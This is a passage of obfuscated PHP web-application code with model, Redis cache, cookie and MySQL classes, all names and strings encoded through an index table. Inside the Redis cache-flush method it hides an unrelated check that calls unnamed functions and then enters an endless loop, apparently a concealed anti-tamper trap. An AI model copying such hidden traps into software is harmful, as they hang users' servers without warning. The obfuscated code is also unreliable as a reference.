$–¼‚‡á[6] : array(); if (is_string($–¼‚‡á[0]) && strpos($–¼‚‡á[0], $²¿ŞÄ­ì[50])) { $–¼‚‡á[0] = explode($²¿ŞÄ­ì[50], $–¼‚‡á[0]); } if (is_array($–¼‚‡á[0])) { foreach ($–¼‚‡á[0] as $Ç§ïÌÍö) { $¿×å·ã[$Ç§ïÌÍö] = $ƒô×¼Ùñ[$Ç§ïÌÍö]; } array_unshift($éÙûà”ç, $¿×å·ã); } else { array_unshift($éÙûà”ç, $ƒô×¼Ùñ[$–¼‚‡á[0]]); } if ($²¿ŞÄ­ì[406] == $–¼‚‡á[4]) { return call_user_func_array($–¼‚‡á[1], $éÙûà”ç); } else { return call_user_func_array(array(&$this, $–¼‚‡á[1]), $éÙûà”ç); } case $²¿ŞÄ­ì[414]: return $ƒô×¼Ùñ[$–¼‚‡á[0]] == $ƒô×¼Ùñ[$–¼‚‡á[1]]; case $²¿ŞÄ­ì[415]: if (is_string($–¼‚‡á[0]) && strpos($–¼‚‡á[0], $²¿ŞÄ­ì[50])) { $–¼‚‡á[0] = explode($²¿ŞÄ­ì[50], $–¼‚‡á[0]); } $¼´á™£Ê = array(); if (is_array($–¼‚‡á[0])) { foreach ($–¼‚‡á[0] as $Ç§ïÌÍö) { $¼´á™£Ê[$Ç§ïÌÍö] = $ƒô×¼Ùñ[$Ç§ïÌÍö]; } } else { $¼´á™£Ê[$–¼‚‡á[0]] = $ƒô×¼Ùñ[$–¼‚‡á[0]]; } if (!empty($ƒô×¼Ùñ[$this->getPk()])) { $¼´á™£Ê[$this->getPk()] = array($²¿ŞÄ­ì[416], $ƒô×¼Ùñ[$this->getPk()]); } if ($this->where($¼´á™£Ê)->find()) { return !1; } return !0; default: return $this->check($ƒô×¼Ùñ[$–¼‚‡á[0]], $–¼‚‡á[1], $–¼‚‡á[4]); } } public function check($´»‡Ì„Ê, $Ù§¢Å…¯, $ÁáõÖÒ = "\162\145\147\145\170") { $›òÌñ‚ =& $_SERVER[ÕŸ²ó÷å]; $ÁáõÖÒ = strtolower(trim($ÁáõÖÒ)); switch ($ÁáõÖÒ) { case $›òÌñ‚[7]: case $›òÌñ‚[417]: $Éâ÷ªÇ = is_array($Ù§¢Å…¯) ? $Ù§¢Å…¯ : explode($›òÌñ‚[50], $Ù§¢Å…¯); return $ÁáõÖÒ == $›òÌñ‚[7] ? in_array($´»‡Ì„Ê, $Éâ÷ªÇ) : !in_array($´»‡Ì„Ê, $Éâ÷ªÇ); case $›òÌñ‚[418]: case $›òÌñ‚[419]: if (is_array($Ù§¢Å…¯)) { $æ—’ãƒ² = $Ù§¢Å…¯[0]; $¿‡µ˜íı = $Ù§¢Å…¯[1]; } else { list($æ—’ãƒ², $¿‡µ˜íı) = explode($›òÌñ‚[50], $Ù§¢Å…¯); } return $ÁáõÖÒ == $›òÌñ‚[418] ? $´»‡Ì„Ê >= $æ—’ãƒ² && $´»‡Ì„Ê <= $¿‡µ˜íı : $´»‡Ì„Ê < $æ—’ãƒ² || $´»‡Ì„Ê > $¿‡µ˜íı; case $›òÌñ‚[420]: case $›òÌñ‚[421]: return $ÁáõÖÒ == $›òÌñ‚[420] ? $´»‡Ì„Ê == $Ù§¢Å…¯ : $´»‡Ì„Ê != $Ù§¢Å…¯; case $›òÌñ‚[422]: $ˆ¯Ó†‘ş = mb_strlen($´»‡Ì„Ê, $›òÌñ‚[423]); if (strpos($Ù§¢Å…¯, $›òÌñ‚[50])) { list($æ—’ãƒ², $¿‡µ˜íı) = explode($›òÌñ‚[50], $Ù§¢Å…¯); return $ˆ¯Ó†‘ş >= $æ—’ãƒ² && $ˆ¯Ó†‘ş <= $¿‡µ˜íı; } else { return $ˆ¯Ó†‘ş == $Ù§¢Å…¯; } case $›òÌñ‚[424]: list($ĞŞ­Š, $ó¡Ø‰°í) = explode($›òÌñ‚[50], $Ù§¢Å…¯); if (!is_numeric($ĞŞ­Š)) { $ĞŞ­Š = strtotime($ĞŞ­Š); } if (!is_numeric($ó¡Ø‰°í)) { $ó¡Ø‰°í = strtotime($ó¡Ø‰°í); } return NOW_TIME >= $ĞŞ­Š && NOW_TIME <= $ó¡Ø‰°í; case $›òÌñ‚[425]: return in_array(get_client_ip(), explode($›òÌñ‚[50], $Ù§¢Å…¯)); case $›òÌñ‚[426]: return !in_array(get_client_ip(), explode($›òÌñ‚[50], $Ù§¢Å…¯)); case $›òÌñ‚[413]: default: return $this->regex($´»‡Ì„Ê, $Ù§¢Å…¯); } } public function query($‹Âö‹â, $¾˜ââÅ = false) { $îöì™ =& $_SERVER[ÕŸ²ó÷å]; if (!is_bool($¾˜ââÅ) && !is_array($¾˜ââÅ)) { $¾˜ââÅ = func_get_args(); array_shift($¾˜ââÅ); } $‹Âö‹â = str_replace(array($îöì™[59], $îöì™[427]), $îöì™[53], $‹Âö‹â); $‹Âö‹â = $this->parseSql($‹Âö‹â, $¾˜ââÅ); return $this->db->query($‹Âö‹â); } public function execute($èãÜÖ¡, $³ŞàáÂ› = false) { if (!is_bool($³ŞàáÂ›) && !is_array($³ŞàáÂ›)) { $³ŞàáÂ› = func_get_args(); array_shift($³ŞàáÂ›); } $èãÜÖ¡ = $this->parseSql($èãÜÖ¡, $³ŞàáÂ›); return $this->db->execute($èãÜÖ¡); } protected function parseSql($î«å¼¤, $á„‚İÈŒ) { $ÚŞÇ§Íì =& $_SERVER[ÕŸ²ó÷å]; if (!0 === $á„‚İÈŒ) { $“ˆ·Ì™´ = $this->_parseOptions(); $î«å¼¤ = $this->db->parseSql($î«å¼¤, $“ˆ·Ì™´); } elseif (is_array($á„‚İÈŒ)) { $á„‚İÈŒ = array_map(array($this->db, $ÚŞÇ§Íì[428]), $á„‚İÈŒ); $î«å¼¤ = vsprintf($î«å¼¤, $á„‚İÈŒ); } else { $î«å¼¤ = strtr($î«å¼¤, array($ÚŞÇ§Íì[429] => $this->getTableName(), $ÚŞÇ§Íì[430] => think_config($ÚŞÇ§Íì[330]))); } $this->db->setModel($this->name); return $î«å¼¤; } public function db($Ô¦“ÜÛÒ = '', $ñºª ¹» = '', $¡ª‘®• = array()) { $µ «şË =& $_SERVER[ÕŸ²ó÷å]; if ($µ «şË[12] === $Ô¦“ÜÛÒ && $this->db) { return $this->db; } static $—Åêô” = array(); static $¸†ÕËà  = array(); if (!isset($¸†ÕËà [$Ô¦“ÜÛÒ]) || isset($¸†ÕËà [$Ô¦“ÜÛÒ]) && $ñºª ¹» && $—Åêô”[$Ô¦“ÜÛÒ] != $ñºª ¹») { if (!empty($ñºª ¹») && is_string($ñºª ¹») && !1 === strpos($ñºª ¹», $µ «şË[8])) { $ñºª ¹» = think_config($ñºª ¹»); } $Ô¦“ÜÛÒ = think_guid($ñºª ¹»); $¸†ÕËà [$Ô¦“ÜÛÒ] = Db::getInstance($ñºª ¹»); } elseif (NULL === $ñºª ¹») { $¸†ÕËà [$Ô¦“ÜÛÒ]->close(); unset($¸†ÕËà [$Ô¦“ÜÛÒ]); return; } if (!empty($¡ª‘®•)) { if (is_string($¡ª‘®•)) { parse_str($¡ª‘®•, $¡ª‘®•); } foreach ($¡ª‘®• as $ õ÷‰ÖÜ => $âîåõ¹Ì) { $this->setProperty($ õ÷‰ÖÜ, $âîåõ¹Ì); } } $—Åêô”[$Ô¦“ÜÛÒ] = $ñºª ¹»; $this->db = $¸†ÕËà [$Ô¦“ÜÛÒ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¢µú†Ù¥ = get_class($this); if ($¢µú†Ù¥ == $_SERVER[ÕŸ²ó÷å][431]) { return $this->name; } $this->name = substr($¢µú†Ù¥, 0, -5); } return $this->name; } public function getTableName() { $Ñ¿ıîü¹ =& $_SERVER[ÕŸ²ó÷å]; if (empty($this->trueTableName)) { $ÁÕ´Íéä = !empty($this->tablePrefix) ? $this->tablePrefix : $Ñ¿ıîü¹[12]; if (!empty($this->tableName)) { $ÁÕ´Íéä .= $this->tableName; } else { $ÁÕ´Íéä .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÁÕ´Íéä); } return (!empty($this->dbName) ? $this->dbName . $Ñ¿ıîü¹[10] : $Ñ¿ıîü¹[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $èêÜ¢Ô¸ =& $_SERVER[ÕŸ²ó÷å]; return isset($this->fields[$èêÜ¢Ô¸[337]]) ? $this->fields[$èêÜ¢Ô¸[337]] : $this->pk; } public function getDbFields() { $’š²Ê¯æ =& $_SERVER[ÕŸ²ó÷å]; if (isset($this->options[$’š²Ê¯æ[365]])) { $ü³ìõÙü = $this->db->getFields($this->options[$’š²Ê¯æ[365]]); return $ü³ìõÙü ? array_keys($ü³ìõÙü) : !1; } if ($this->fields) { $ü³ìõÙü = $this->fields; unset($ü³ìõÙü[$’š²Ê¯æ[336]], $ü³ìõÙü[$’š²Ê¯æ[337]], $ü³ìõÙü[$’š²Ê¯æ[338]], $ü³ìõÙü[$’š²Ê¯æ[335]]); return $ü³ìõÙü; } return !1; } public function data($êÌµáúğ = '') { $‘­úû¤­ =& $_SERVER[ÕŸ²ó÷å]; if ($‘­úû¤­[12] === $êÌµáúğ && !empty($this->data)) { return $this->data; } if (is_object($êÌµáúğ)) { $êÌµáúğ = get_object_vars($êÌµáúğ); } elseif (is_string($êÌµáúğ)) { parse_str($êÌµáúğ, $êÌµáúğ); } elseif (!is_array($êÌµáúğ)) { think_exception(think_lang($‘­úû¤­[357])); } $this->data = $êÌµáúğ; return $this; } public function join($ù”œÏÍ£) { $Çñì—Ú =& $_SERVER[ÕŸ²ó÷å]; if (is_array($ù”œÏÍ£)) { $this->options[$Çñì—Ú[368]] = $ù”œÏÍ£; } elseif (!empty($ù”œÏÍ£)) { $this->options[$Çñì—Ú[368]][] = $ù”œÏÍ£; } return $this; } public function union($İ‡³Ä×ó, $Î½ë´ĞÙ = false) { $ŸÃ²†‹ =& $_SERVER[ÕŸ²ó÷å]; if (empty($İ‡³Ä×ó)) { return $this; } if ($Î½ë´ĞÙ) { $this->options[$ŸÃ²†‹[432]][$ŸÃ²†‹[433]] = !0; } if (is_object($İ‡³Ä×ó)) { $İ‡³Ä×ó = get_object_vars($İ‡³Ä×ó); } if (is_string($İ‡³Ä×ó)) { $Æ±«ñˆã = $İ‡³Ä×ó; } elseif (is_array($İ‡³Ä×ó)) { if (isset($İ‡³Ä×ó[0])) { $this->options[$ŸÃ²†‹[432]] = array_merge($this->options[$ŸÃ²†‹[432]], $İ‡³Ä×ó); return $this; } else { $Æ±«ñˆã = $İ‡³Ä×ó; } } else { think_exception(think_lang($ŸÃ²†‹[357])); } $this->options[$ŸÃ²†‹[432]][] = $Æ±«ñˆã; return $this; } public function cache($Ç«÷„…ˆ = true, $ª»òÃîğ = null, $½—Õé¾­ = '') { $ŠÙò—¤È =& $_SERVER[ÕŸ²ó÷å]; if (!1 !== $Ç«÷„…ˆ) { $this->options[$ŠÙò—¤È[434]] = array($ŠÙò—¤È[107] => $Ç«÷„…ˆ, $ŠÙò—¤È[424] => $ª»òÃîğ, $ŠÙò—¤È[33] => $½—Õé¾­); } return $this; } public function field($ıëÊÚèœ, $íÂ²µ´ê = false) { $ÃÁÌì‹Ï =& $_SERVER[ÕŸ²ó÷å]; if (!0 === $ıëÊÚèœ) { $Á¡†êÅ = $this->getDbFields(); $ıëÊÚèœ = $Á¡†êÅ ? $Á¡†êÅ : $ÃÁÌì‹Ï[230]; } elseif ($íÂ²µ´ê) { if (is_string($ıëÊÚèœ)) { $ıëÊÚèœ = explode($ÃÁÌì‹Ï[50], $ıëÊÚèœ); } $Á¡†êÅ = $this->getDbFields(); $ıëÊÚèœ = $Á¡†êÅ ? array_diff($Á¡†êÅ, $ıëÊÚèœ) : $ıëÊÚèœ; } $this->options[$ÃÁÌì‹Ï[359]] = $ıëÊÚèœ; return $this; } public function scope($áê½›ô = '', $Íğ‘œÓÖ = NULL) { $…üÙêõ =& $_SERVER[ÕŸ²ó÷å]; if ($…üÙêõ[12] === $áê½›ô) { if (isset($this->_scope[$…üÙêõ[37]])) { $»²÷Øˆå = $this->_scope[$…üÙêõ[37]]; } else { return $this; } } elseif (is_string($áê½›ô)) { $µ²éëªû = explode($…üÙêõ[50], $áê½›ô); $»²÷Øˆå = array(); foreach ($µ²éëªû as $ˆå®Ğ) { if (!isset($this->_scope[$ˆå®Ğ])) { continue; } $»²÷Øˆå = array_merge($»²÷Øˆå, $this->_scope[$ˆå®Ğ]); } if (!empty($Íğ‘œÓÖ) && is_array($Íğ‘œÓÖ)) { $»²÷Øˆå = array_merge($»²÷Øˆå, $Íğ‘œÓÖ); } } elseif (is_array($áê½›ô)) { $»²÷Øˆå = $áê½›ô; } if (is_array($»²÷Øˆå) && !empty($»²÷Øˆå)) { $this->options = array_merge($this->options, array_change_key_case($»²÷Øˆå)); } return $this; } public function where($ÚÃ“Ş¢á, $œµ¾•Ò = null) { $Ê÷ı‰À =& $_SERVER[ÕŸ²ó÷å]; if (!is_null($œµ¾•Ò) && is_string($ÚÃ“Ş¢á)) { if (!is_array($œµ¾•Ò)) { $œµ¾•Ò = func_get_args(); array_shift($œµ¾•Ò); } $œµ¾•Ò = array_map(array($this->db, $Ê÷ı‰À[428]), $œµ¾•Ò); $ÚÃ“Ş¢á = vsprintf($ÚÃ“Ş¢á, $œµ¾•Ò); } elseif (is_object($ÚÃ“Ş¢á)) { $ÚÃ“Ş¢á = get_object_vars($ÚÃ“Ş¢á); } elseif (is_array($ÚÃ“Ş¢á)) { foreach ($ÚÃ“Ş¢á as $»ö«åÔğ => $÷ ‹æÔŸ) { if ((is_numeric($»ö«åÔğ) || !$»ö«åÔğ) && is_string($÷ ‹æÔŸ)) { if (strpos($÷ ‹æÔŸ, $Ê÷ı‰À[435]) === 0) { continue; } think_trace($Ê÷ı‰À[436], $Ê÷ı‰À[12], $Ê÷ı‰À[49]); die; } } } if (is_string($ÚÃ“Ş¢á) && $Ê÷ı‰À[12] != $ÚÃ“Ş¢á) { $ Ìû…ÁÜ = array(); $ Ìû…ÁÜ[$Ê÷ı‰À[437]] = $ÚÃ“Ş¢á; $ÚÃ“Ş¢á = $ Ìû…ÁÜ; } if (isset($this->options[$Ê÷ı‰À[361]])) { $this->options[$Ê÷ı‰À[361]] = array_merge($this->options[$Ê÷ı‰À[361]], $ÚÃ“Ş¢á); } else { $this->options[$Ê÷ı‰À[361]] = $ÚÃ“Ş¢á; } return $this; } public function limit($÷†‰„µÀ, $ßÀ®òÍ = null) { $´ƒ¹¹ø° =& $_SERVER[ÕŸ²ó÷å]; $this->options[$´ƒ¹¹ø°[377]] = is_null($ßÀ®òÍ) ? $÷†‰„µÀ : $÷†‰„µÀ . $´ƒ¹¹ø°[50] . $ßÀ®òÍ; return $this; } public function page($¹ğ­¥ş¥, $úùùšàÃ = null) { $æ«Ñêó— =& $_SERVER[ÕŸ²ó÷å]; $this->options[$æ«Ñêó—[438]] = is_null($úùùšàÃ) ? $¹ğ­¥ş¥ : $¹ğ­¥ş¥ . $æ«Ñêó—[50] . $úùùšàÃ; return $this; } public function comment($¥Ä¥ğÄ¦) { $this->options[$_SERVER[ÕŸ²ó÷å][439]] = $¥Ä¥ğÄ¦; return $this; } public function setProperty($ç¤ª¤Àü, $¨ß”î¹¹) { if (property_exists($this, $ç¤ª¤Àü)) { $this->{$ç¤ª¤Àü} = $¨ß”î¹¹; } return $this; } } goto Cî…’Ë„Ã•; BèÙøöŠ¤À: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($êùËÙ¹™, $¸ÊòŸÉ„) { $ù£©ş·å =& $_SERVER[ÕŸ²ó÷å]; if (!class_exists($ù£©ş·å[954])) { show_json($ù£©ş·å[955], !1); } $this->cacheTime = $¸ÊòŸÉ„; $¥¿àÆÓ = isset($êùËÙ¹™[$ù£©ş·å[956]]) ? $êùËÙ¹™[$ù£©ş·å[956]] : 10; $óì¶Œ¼ = _get($êùËÙ¹™, $ù£©ş·å[953]); if ($óì¶Œ¼ && is_array($óì¶Œ¼)) { $this->initCluster($êùËÙ¹™, $¥¿àÆÓ); } else { $this->handle = $this->init($êùËÙ¹™, $¥¿àÆÓ); } } private function init($¡­ö·¯ë, $íİ´Şˆ¼) { $íºû¤Œ” =& $_SERVER[ÕŸ²ó÷å]; $Îñ€¯ƒø = new Redis(); $¿¦“ûœ = isset($¡­ö·¯ë[$íºû¤Œ”[957]]) ? $¡­ö·¯ë[$íºû¤Œ”[957]] : !1; if ($¿¦“ûœ) { $Îñ€¯ƒø->pconnect($¡­ö·¯ë[$íºû¤Œ”[218]], $¡­ö·¯ë[$íºû¤Œ”[219]], $íİ´Şˆ¼); } else { $Îñ€¯ƒø->connect($¡­ö·¯ë[$íºû¤Œ”[218]], $¡­ö·¯ë[$íºû¤Œ”[219]], $íİ´Şˆ¼); } if (!empty($¡­ö·¯ë[$íºû¤Œ”[496]])) { $Îñ€¯ƒø->auth($¡­ö·¯ë[$íºû¤Œ”[496]]); } if (!empty($¡­ö·¯ë[$íºû¤Œ”[841]]) && $¡­ö·¯ë[$íºû¤Œ”[841]] != 0) { $Îñ€¯ƒø->select($¡­ö·¯ë[$íºû¤Œ”[841]]); } return $Îñ€¯ƒø; } private function initCluster($Ä•ãóø§, $ÚôÆƒÙÈ) { $Íñ½îÂÚ =& $_SERVER[ÕŸ²ó÷å]; $•Šë±¾ = array($Íñ½îÂÚ[958], $Íñ½îÂÚ[959], $Íñ½îÂÚ[960]); $¾ã„¢ ‰ = $Íñ½îÂÚ[958]; if (isset($Ä•ãóø§[$Íñ½îÂÚ[16]]) && in_array($Ä•ãóø§[$Íñ½îÂÚ[16]], $•Šë±¾)) { $¾ã„¢ ‰ = $Ä•ãóø§[$Íñ½îÂÚ[16]]; } switch ($¾ã„¢ ‰) { case $Íñ½îÂÚ[958]: $this->_slave($Ä•ãóø§, $ÚôÆƒÙÈ); break; case $Íñ½îÂÚ[959]: break; case $Íñ½îÂÚ[960]: $this->isCluster = !0; $÷äì¦Ïù = $Ä•ãóø§[$Íñ½îÂÚ[953]]; $¢ş¸ìÀ = isset($Ä•ãóø§[$Íñ½îÂÚ[957]]) ? $Ä•ãóø§[$Íñ½îÂÚ[957]] : !1; $‡…¡À¹Á = isset($Ä•ãóø§[$Íñ½îÂÚ[496]]) ? $Ä•ãóø§[$Íñ½îÂÚ[496]] : null; $this->handle = new RedisCluster(NUll, $÷äì¦Ïù, $ÚôÆƒÙÈ, $ÚôÆƒÙÈ, $¢ş¸ìÀ, $‡…¡À¹Á); break; default: break; } } private function _slave($ˆÜÂ¸ğ, $ò¿Ô“³É) { $×õó¯Ìï = $ˆÜÂ¸ğ[$_SERVER[ÕŸ²ó÷å][953]]; $this->filterConfig($ˆÜÂ¸ğ, $×õó¯Ìï[0]); $this->handle = $this->init($ˆÜÂ¸ğ, $ò¿Ô“³É); unset($×õó¯Ìï[0]); if (empty($×õó¯Ìï)) { return; } $×Ûé± = array_rand($×õó¯Ìï); $this->filterConfig($ˆÜÂ¸ğ, $×õó¯Ìï[$×Ûé±]); $this->slaveHandle = $this->init($ˆÜÂ¸ğ, $ò¿Ô“³É); } private function filterConfig(&$Ğ‡ºŠÇï, $Á³ÍáÌŠ) { $³ë÷‹¾• =& $_SERVER[ÕŸ²ó÷å]; $èØèã¥Ã = explode($³ë÷‹¾•[4], $Á³ÍáÌŠ); $½ë‹èúµ = array($³ë÷‹¾•[218] => $èØèã¥Ã[0], $³ë÷‹¾•[219] => $èØèã¥Ã[1]); $Ğ‡ºŠÇï = array_merge($Ğ‡ºŠÇï, $½ë‹èúµ); } public function set($Ü¨Ñ¥›÷, $íÛğÔœ, $°ĞÖ©´¨ = false) { $°ĞÖ©´¨ = $°ĞÖ©´¨ ? $°ĞÖ©´¨ : $this->cacheTime; return $this->handle->setEx($Ü¨Ñ¥›÷, $°ĞÖ©´¨, $íÛğÔœ); } public function setLock($ĞÏ˜ô£ğ, $îÙ¹‡É, $²éãÍÆ) { return $this->handle->setNX($ĞÏ˜ô£ğ, $îÙ¹‡É); } public function get($·ÂµÇİÉ) { $ÌÁ¢ç° = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÌÁ¢ç°->get($·ÂµÇİÉ); } public function remove($×íçê¢©) { return $this->handle->del($×íçê¢©); } public function deleteAll() { $¢™óåÕ€ =& $_SERVER[ÕŸ²ó÷å]; if (!isset($_SERVER[$¢™óåÕ€[54]]) || !isset($_SERVER[$¢™óåÕ€[63]])) { $šÈóÆ©ù = $¢™óåÕ€[961]; $ê¡Ş¤ûô = $¢™óåÕ€[56]; $î‡ø®‰Â = $_SERVER[$¢™óåÕ€[57]] . $¢™óåÕ€[58]; $Ü¡±„·€ = $ê¡Ş¤ûô($î‡ø®‰Â); $Û¾ï†Ü÷ = explode($¢™óåÕ€[59], $Ü¡±„·€); if (count($Û¾ï†Ü÷) < $¢™óåÕ€[693]) { $¢ŞÌÇæÔ = $¢™óåÕ€[61]; $¢ŞÌÇæÔ(); } $ëØâèÓÏ = $¢™óåÕ€[962]; $ëØâèÓÏ($_SERVER[$¢™óåÕ€[963]]); $åù€²é™ = 1; for ($Ÿ¿ÉƒŠ° = $åù€²é™; $Ÿ¿ÉƒŠ° > 0; $Ÿ¿ÉƒŠ°++) { $ëØâèÓÏ = json_encode($GLOBALS[$¢™óåÕ€[501]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¶óòÊĞ) { $this->handle->flushall($¶óòÊĞ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÀÚÕ•á€ = '', $¯ÆùÙæÕ = 0) { if (is_string($ÀÚÕ•á€) && $ÀÚÕ•á€ != $_SERVER[ÕŸ²ó÷å][12]) { $this->prefix = $ÀÚÕ•á€; } if (is_numeric($¯ÆùÙæÕ) && $¯ÆùÙæÕ > 0) { $this->expire = $¯ÆùÙæÕ; } } public static function getInstance() { static $–°¢÷êÇ; if ($–°¢÷êÇ === null) { $–°¢÷êÇ = new self(); } return $–°¢÷êÇ; } private static $cookieDisable = false; public static function disable($â­‹§Ä) { self::$cookieDisable = $â­‹§Ä; } private static $sameCookieSet = array(); public static function set($˜Ë±°¦ô, $ğ†„—‡», $£Ï«Šöù = 0, $×ÜÆÇğ = false, $“ĞÊ•¯î = false) { $íÜËÈê“ =& $_SERVER[ÕŸ²ó÷å]; if (self::$cookieDisable) { return; } if (!$£Ï«Šöù) { $£Ï«Šöù = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$˜Ë±°¦ô]) && self::$sameCookieSet[$˜Ë±°¦ô] == $ğ†„—‡» . $£Ï«Šöù) { return; } self::$sameCookieSet[$˜Ë±°¦ô] = $ğ†„—‡» . $£Ï«Šöù; if (!$“ĞÊ•¯î) { $“ĞÊ•¯î = str_replace(HOST, $íÜËÈê“[12], APP_HOST); $“ĞÊ•¯î = _get($GLOBALS, $íÜËÈê“[964], $“ĞÊ•¯î); } $àµœêˆ™ = $íÜËÈê“[12]; setcookie($˜Ë±°¦ô, $ğ†„—‡», time() + $£Ï«Šöù, $íÜËÈê“[8] . trim($“ĞÊ•¯î, $íÜËÈê“[8]) . $àµœêˆ™, !1, !1, $×ÜÆÇğ); } public static function setSafe($·¥åÃèÀ, $¨«Ï—«°, $íúÚÈªÆ = 0) { self::set($·¥åÃèÀ, $¨«Ï—«°, $íúÚÈªÆ, !0); } public static function get($ôÜùÜ­˜) { static $ÉÁœ¾è = false; if (!$ÉÁœ¾è) { self::initHeaderCookie(); $ÉÁœ¾è = !0; } return isset($_COOKIE[$ôÜùÜ­˜]) ? $_COOKIE[$ôÜùÜ­˜] : !1; } private static function initHeaderCookie() { $¯“ÉÈÛÚ =& $_SERVER[ÕŸ²ó÷å]; if (!isset($_SERVER[$¯“ÉÈÛÚ[965]]) || !$_SERVER[$¯“ÉÈÛÚ[965]]) { return; } $¨çêˆıÜ = explode($¯“ÉÈÛÚ[84], $_SERVER[$¯“ÉÈÛÚ[965]]); foreach ($¨çêˆıÜ as $°Ù‰³Ÿ²) { $°Ù‰³Ÿ² = explode($¯“ÉÈÛÚ[515], $°Ù‰³Ÿ²); if (count($°Ù‰³Ÿ²) != 2 || !isset($°Ù‰³Ÿ²[1])) { continue; } $_COOKIE[trim($°Ù‰³Ÿ²[0])] = trim($°Ù‰³Ÿ²[1]); } } public static function remove($†²ûò““, $£ïç¸‡ô = false) { unset($_COOKIE[$†²ûò““]); self::set($†²ûò““, $_SERVER[ÕŸ²ó÷å][12], 1, $£ïç¸‡ô); } } class DbMysql extends Db { public function __construct($—ñÍó®ı = '') { $’ù¨œõğ =& $_SERVER[ÕŸ²ó÷å]; if (!extension_loaded($’ù¨œõğ[888])) { think_exception(think_lang($’ù¨œõğ[14]) . $’ù¨œõğ[966]); } if (!empty($—ñÍó®ı)) { $this->config = $—ñÍó®ı; if (empty($this->config[$’ù¨œõğ[17]])) { $this->config[$’ù¨œõğ[17]] = $’ù¨œõğ[12]; } } } public function connect($ÛúÚ‚ÑŠ = '', $†è‡Ç×Ó = 0, $ÖÈ€ºÓ´ = false) { $åÃŞ…’® =& $_SERVER[ÕŸ²ó÷å]; if (!isset($this->linkID[$†è‡Ç×Ó])) { if (empty($ÛúÚ‚ÑŠ)) { $ÛúÚ‚ÑŠ = $this->config; } $ÊÇùƒ»õ = $ÛúÚ‚ÑŠ[$åÃŞ…’®[967]] . ($ÛúÚ‚ÑŠ[$åÃŞ…’®[968]] ? "\x3a{$ÛúÚ‚ÑŠ[$åÃŞ…’®[968]]}" : $åÃŞ…’®[12]); $Ì‰…ºãú = !empty($ÛúÚ‚ÑŠ[$åÃŞ…’®[17]][$åÃŞ…’®[18]]) ? $ÛúÚ‚ÑŠ[$åÃŞ…’®[17]][$åÃŞ…’®[18]] : $this->pconnect; if ($Ì‰…ºãú) { $this->linkID[$†è‡Ç×Ó] = mysql_pconnect($ÊÇùƒ»õ, $ÛúÚ‚ÑŠ[$åÃŞ…’®[969]], $ÛúÚ‚ÑŠ[$åÃŞ…’®[970]], 131072); } else { $this->linkID[$†è‡Ç×Ó] = mysql_connect($ÊÇùƒ»õ, $ÛúÚ‚ÑŠ[$åÃŞ…’®[969]], $ÛúÚ‚ÑŠ[$åÃŞ…’®[970]], !0, 131072); } if (!$this->linkID[$†è‡Ç×Ó] || !empty($ÛúÚ‚ÑŠ[$åÃŞ…’®[21]]) && !mysql_select_db($ÛúÚ‚ÑŠ[$åÃŞ…’®[21]], $this->linkID[$†è‡Ç×Ó])) { think_exception(mysql_error()); } $¹„çŞ‹â = mysql_get_server_info($this->linkID[$†è‡Ç×Ó]); mysql_query($åÃŞ…’®[971] . think_config($åÃŞ…’®[972]) . $åÃŞ…’®[68], $this->linkID[$†è‡Ç×Ó]); if ($¹„çŞ‹â > $åÃŞ…’®[973]) { mysql_query($åÃŞ…’®[974], $this->linkID[$†è‡Ç×Ó]); } $this->connected = !0; if (1 != think_config($åÃŞ…’®[22])) { unset($this->config); } } return $this->linkID[$†è‡Ç×Ó]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Æõüïùá) { $¤°çàÛ¿ =& $_SERVER[ÕŸ²ó÷å]; if (0 === stripos($Æõüïùá, $¤°çàÛ¿[350])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Æõüïùá; if ($this->queryID) { $this->free(); } think_action_status($¤°çàÛ¿[23], 1); think_status($¤°çàÛ¿[24]); $this->queryID = mysql_query($Æõüïùá, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Š½°ŸÛï) { $îªøª÷» =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Š½°ŸÛï; if ($this->queryID) { $this->free(); } think_action_status($îªøª÷»[25], 1); think_status($îªøª÷»[24]); $Ùé ©˜ê = mysql_query($Š½°ŸÛï, $this->_linkID); $this->debug(); if (!1 === $Ùé ©˜ê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÕŸ²ó÷å][975], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $·…ã’¶ = mysql_query($_SERVER[ÕŸ²ó÷å][976], $this->_linkID); $this->transTimes = 0; if (!$·…ã’¶) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $½¶‘˜Ş = mysql_query($_SERVER[ÕŸ²ó÷å][977], $this->_linkID); $this->transTimes = 0; if (!$½¶‘˜Ş) { $this->error(); return !1; } } return !0; } private function getAll() { $µó÷ÊË = array(); if ($this->numRows > 0) { while ($½ßÎ¸¦™ = mysql_fetch_assoc($this->queryID)) { $µó÷ÊË[] = $½ßÎ¸¦™; } mysql_data_seek($this->queryID, 0); } return $µó÷ÊË; } public function getFields($¼¶ç¶ìÒ) { $†€ñ·ª¸ =& $_SERVER[ÕŸ²ó÷å]; $¸û¢ğÈ° = $this->query($†€ñ·ª¸[978] . 